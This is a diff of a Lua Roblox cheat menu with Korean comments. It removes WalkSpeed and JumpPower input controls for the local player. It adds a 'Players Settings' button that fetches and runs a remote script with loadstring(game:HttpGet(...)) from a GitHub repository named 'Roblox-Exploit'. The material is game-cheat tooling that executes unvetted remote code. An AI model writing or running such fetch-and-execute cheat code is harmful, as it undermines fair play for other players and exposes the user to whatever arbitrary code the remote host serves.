@@ -256,128 +256,16 @@ local ThirdSection = ThirdTab:CreateSection("속도 및 점프")
 
 
 
--- 기본값 변수
-
-local inputSpeed = 16 -- 기본 WalkSpeed
-
-local inputJumpPower = 50 -- 기본 JumpPower
-
-
-
--- 속도 입력 필드
-
-ThirdTab:CreateInput({
-
-    Name = "WalkSpeed",
-
-    PlaceholderText = "input",
-
-    RemoveTextAfterFocusLost = false,
-
-    Callback = function(Text)
-
-        local number = tonumber(Text) -- 입력 값을 숫자로 변환
-
-        if number and number >= 1 and number <= 300 then
-
-            inputSpeed = number
-
-            print("속도 설정 : " .. inputSpeed)
-
-        else
-
-            print("유효하지 않은 속도입니다. (1~300 사이로 입력하세요)")
-
-        end
-
-    end,
-
-})
-
-
-
--- 속도 설정 실행 버튼
-
 ThirdTab:CreateButton({
 
-    Name = "WalkSpeed Execute",
+   Name = "Players Settings",
 
-    Callback = function()
+   Callback = function()
 
-        local character = game.Players.LocalPlayer.Character
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/QP-Community/Roblox-Exploit/main/Sirius"))()
 
-        if character and character:FindFirstChild("Humanoid") then
+       print("Player Activated!")
 
-            character.Humanoid.WalkSpeed = inputSpeed
-
-            print("WalkSpeed 설정됨: " .. inputSpeed)
-
-        else
-
-            print("캐릭터가 로드되지 않았습니다.")
-
-        end
-
-    end,
-
-})
-
-
-
--- 점프력 입력 필드
-
-ThirdTab:CreateInput({
-
-    Name = "JumpPower",
-
-    PlaceholderText = "Input",
-
-    RemoveTextAfterFocusLost = false,
-
-    Callback = function(Text)
-
-        local number = tonumber(Text) -- 입력 값을 숫자로 변환
-
-        if number and number >= 1 and number <= 500 then
-
-            inputJumpPower = number
-
-            print("점프력 설정 : " .. inputJumpPower)
-
-        else
-
-            print("유효하지 않은 점프력입니다. (1~500 사이로 입력하세요)")
-
-        end
-
-    end,
-
-})
-
-
-
--- 점프력 설정 실행 버튼
-
-ThirdTab:CreateButton({
-
-    Name = "JumpPower Execute",
-
-    Callback = function()
-
-        local character = game.Players.LocalPlayer.Character
-
-        if character and character:FindFirstChild("Humanoid") then
-
-            character.Humanoid.JumpPower = inputJumpPower
-
-            print("JumpPower 설정됨: " .. inputJumpPower)
-
-        else
-
-            print("캐릭터가 로드되지 않았습니다.")
-
-        end
-
-    end,
+   end,
 
 })
